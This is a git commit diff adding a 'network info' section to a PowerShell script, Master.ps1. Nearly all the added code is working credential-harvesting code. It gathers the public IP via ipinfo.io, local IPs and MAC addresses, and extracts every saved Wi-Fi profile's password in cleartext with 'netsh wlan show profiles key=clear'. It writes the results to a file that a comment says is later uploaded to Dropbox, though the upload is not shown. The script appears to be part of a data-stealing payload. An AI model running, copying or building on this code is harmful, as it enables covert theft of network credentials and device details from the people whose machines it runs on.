bdcc1ae7e34469ec86a21cc92895c04f51f61e5f
LabSeb <35532325+SnowGlobeio@users.noreply.github.com>
2023-07-10 17:14:28 +0200

    Update Master.ps1
    Full Network infos

--- Master.ps1
+++ Master.ps1
@@ -8,8 +8,86 @@
 
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_info.txt"
 
+#------------------------------------------------------------------------------------------------------------------------------------
+# Network info
+function Get-PubIP {
 
+    try {
 
+    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+
+    }
+ 
+ # If no Public IP is detected function will return $null to avoid sapi speak
+
+    # Write Error is just for troubleshooting 
+    catch {Write-Error "No Public IP was detected" 
+    return $null
+    -ErrorAction SilentlyContinue
+    }
+
+    return $computerPubIP
+}
+
+$PubIP = Get-PubIP
+$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String
+$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String
+
+#------------------------------------------------------------------------------------------------------------------------------------
+$output = @"
+
+Public IP: 
+$PubIP
+
+Local IPs:
+$localIP
+
+MAC:
+$MAC
+
+"@
+
+$output > $FileName
+
+# All about Wifi
+$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
+
+# Get Wifi SSIDs and Passwords	
+$WLANProfileNames =@()
+
+#Get all the WLAN profile names
+$Output = netsh.exe wlan show profiles | Select-String -pattern " : "
+
+#Trim the output to receive only the name
+Foreach($WLANProfileName in $Output){
+    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
+}
+$WLANProfileObjects =@()
+
+#Bind the WLAN profile names and also the password to a custom object
+Foreach($WLANProfileName in $WLANProfileNames){
+
+    #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
+    try{
+        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
+    }Catch{
+        $WLANProfilePassword = "The password is not stored in this profile"
+    }
+
+    #Build the object and add this to an array
+    $WLANProfileObject = New-Object PSCustomobject 
+    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
+    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
+    $WLANProfileObjects += $WLANProfileObject
+    Remove-Variable WLANProfileObject
+}
+    if (!$WLANProfileObjects) { Write-Host "variable is null" 
+    }else { 
+
+	# This is the name of the file the networks and passwords are saved to and later uploaded to the DropBox Cloud Storage
+
+	echo "`nW-Lan profiles: ===============================" $WLANProfileObjects >> $FileName
+#--------------------------------------------------------------------------------------------------------------------------------------
 <#
 
 .NOTES 
